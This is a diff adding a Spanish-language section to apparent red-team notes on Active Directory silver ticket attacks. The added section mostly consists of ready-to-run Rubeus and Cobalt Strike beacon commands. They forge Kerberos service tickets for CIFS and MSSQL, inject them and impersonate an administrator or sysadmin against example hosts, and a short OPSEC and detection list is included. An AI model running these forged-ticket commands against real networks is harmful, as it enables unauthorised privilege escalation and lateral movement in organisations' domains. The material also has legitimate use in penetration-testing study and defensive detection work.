@@ -99,3 +99,51 @@ impacket-mssqlclient -k nagoya.nagoya-industries.com
 ## Ver también
 - [[05-ad-attacks/kerberos/kerberoasting|Kerberoasting]]
 - [[05-ad-attacks/kerberos/constrained-delegation|Constrained Delegation]]
+
+---
+
+## Cobalt Strike / Rubeus
+
+### Forjar ST para CIFS (acceso remoto a máquina)
+
+```
+# Desde máquina Windows — hash del computer account
+Rubeus.exe silver /service:cifs/lon-db-1 /aes256:<computer_aes256> /user:Administrator /domain:CONTOSO.COM /sid:<domain_SID> /nowrap
+
+beacon> make_token CONTOSO\Administrator FakePass
+beacon> execute-assembly Rubeus.exe ptt /ticket:<b64_ticket>
+beacon> ls \\lon-db-1\c$
+beacon> rev2self
+```
+
+> Los hashes de cuentas de máquina se rotan automáticamente cada **30 días**.
+
+### Forjar ST para MSSQLSvc (sysadmin en BBDD sin serlo realmente)
+
+```powershell
+# 1. Convertir contraseña a hash
+Rubeus.exe hash /user:mssql_svc /domain:CONTOSO.COM /password:Passw0rd!
+# → rc4_hmac: FC525C9683E8FE067095BA2DDC971889
+# → aes256:   E4A51DAD46B6D1BA85627EEC82991C8FC94C279CE06140751E02BA015E6A21F9
+
+# 2. Forjar ST impersonando a un sysadmin (con sus RIDs reales)
+Rubeus.exe silver /service:MSSQLSvc/lon-db-1.contoso.com:1433 /rc4:<rc4> /user:rsteel /id:<RID_rsteel> /groups:513,<grupos_rsteel> /domain:CONTOSO.COM /sid:<domain_SID> /nowrap
+
+beacon> make_token CONTOSO\rsteel FakePass
+beacon> execute-assembly Rubeus.exe ptt /ticket:<b64_ticket>
+# → Ahora tienes sysadmin en MSSQL como rsteel
+```
+
+### OPSEC
+
+- **PAC validation** mitiga silver tickets — el equipo destino valida el checksum con el DC; si está firmado con el hash del equipo (no con krbtgt) falla
+- Detección: **4624** en el equipo destino sin **4769** previo en el DC → ticket forjado
+- El realm debe estar en mayúsculas (Rubeus lo hace automáticamente)
+
+---
+
+## Ver también (ampliado)
+
+- [[05-ad-attacks/ataques/golden-ticket|Golden Ticket]] — versión con krbtgt, acceso a todo el dominio
+- [[05-ad-attacks/ataques/dcsync|DCSync]] — cómo obtener hashes para forjar tickets
+- [[12-tools--and--referencia/ports/1433-mssql|1433 MSSQL]] — uso práctico del silver ticket contra MSSQL
